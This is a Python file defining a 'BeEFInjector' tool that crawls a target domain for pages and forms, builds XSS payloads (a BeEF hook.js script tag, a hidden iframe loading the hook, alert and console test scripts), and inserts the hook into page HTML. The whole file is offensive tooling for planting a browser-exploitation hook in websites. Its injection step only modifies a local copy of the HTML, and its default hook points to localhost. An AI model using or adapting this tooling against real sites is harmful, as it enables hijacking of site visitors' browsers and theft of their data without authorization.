import requests
import re
from urllib.parse import urljoin, urlparse

class BeEFInjector:
    def __init__(self, beef_hook_url="http://localhost:3000/hook.js"):
        self.beef_hook_url = beef_hook_url
        self.injected_urls = []
    
    def inject_hook(self, target_url):
        try:
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"http://{target_url}"
            
            response = requests.get(target_url, timeout=10)
            html_content = response.text
            
            if self._is_hook_already_injected(html_content):
                return {"status": "already_injected", "url": target_url}
            
            modified_html = self._inject_hook_into_html(html_content)
            
            return {
                "status": "success",
                "url": target_url,
                "original_size": len(html_content),
                "modified_size": len(modified_html),
                "hook_url": self.beef_hook_url
            }
            
        except Exception as e:
            return {"status": "error", "url": target_url, "error": str(e)}
    
    def _is_hook_already_injected(self, html_content):
        hook_patterns = [
            r'beef\.js',
            r'hook\.js',
            r'localhost:3000',
            r'beef_hook'
        ]
        
        for pattern in hook_patterns:
            if re.search(pattern, html_content, re.IGNORECASE):
                return True
        return False
    
    def _inject_hook_into_html(self, html_content):
        hook_script = f'<script src="{self.beef_hook_url}"></script>'
        
        if '</head>' in html_content:
            return html_content.replace('</head>', f'{hook_script}\n</head>')
        elif '</body>' in html_content:
            return html_content.replace('</body>', f'{hook_script}\n</body>')
        else:
            return html_content + hook_script
    
    def scan_for_injectable_pages(self, base_url):
        injectable_pages = []
        
        try:
            if not base_url.startswith(('http://', 'https://')):
                base_url = f"http://{base_url}"
            
            response = requests.get(base_url, timeout=10)
            html_content = response.text
            
            if self._is_injectable_page(html_content):
                injectable_pages.append({
                    "url": base_url,
                    "type": "main_page",
                    "injectable": True
                })
            
            forms = self._find_forms(html_content, base_url)
            for form in forms:
                injectable_pages.append({
                    "url": form,
                    "type": "form_page",
                    "injectable": True
                })
                
        except Exception as e:
            print(f"Error scanning {base_url}: {e}")
        
        return injectable_pages
    
    def _is_injectable_page(self, html_content):
        return any(tag in html_content.lower() for tag in ['<html', '<head', '<body'])
    
    def _find_forms(self, html_content, base_url):
        forms = []
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
        
        for match in re.finditer(form_pattern, html_content):
            action = match.group(1)
            if action:
                if action.startswith('http'):
                    forms.append(action)
                else:
                    forms.append(urljoin(base_url, action))
        
        return forms
    
    def create_injection_payload(self, target_url, payload_type="hook"):
        payloads = {
            "hook": f'<script src="{self.beef_hook_url}"></script>',
            "alert": '<script>alert("XSS Test");</script>',
            "console": '<script>console.log("Injection successful");</script>',
            "iframe": f'<iframe src="{self.beef_hook_url}" style="display:none;"></iframe>'
        }
        
        return {
            "target_url": target_url,
            "payload_type": payload_type,
            "payload": payloads.get(payload_type, payloads["hook"]),
            "hook_url": self.beef_hook_url
        }
    
    def test_injection(self, target_url, payload):
        try:
            response = requests.get(target_url, timeout=10)
            html_content = response.text
            
            if payload in html_content:
                return {"status": "injected", "url": target_url}
            else:
                return {"status": "not_injected", "url": target_url}
                
        except Exception as e:
            return {"status": "error", "url": target_url, "error": str(e)}

def inject_beef_hook(target_domain):
    injector = BeEFInjector()
    
    results = {
        "target": target_domain,
        "injectable_pages": [],
        "injection_results": [],
        "payloads": []
    }
    
    print(f"Scanning {target_domain} for injection points...")
    
    injectable_pages = injector.scan_for_injectable_pages(target_domain)
    results["injectable_pages"] = injectable_pages
    
    for page in injectable_pages:
        if page["injectable"]:
            injection_result = injector.inject_hook(page["url"])
            results["injection_results"].append(injection_result)
            
            payload = injector.create_injection_payload(page["url"])
            results["payloads"].append(payload)
    
    return results 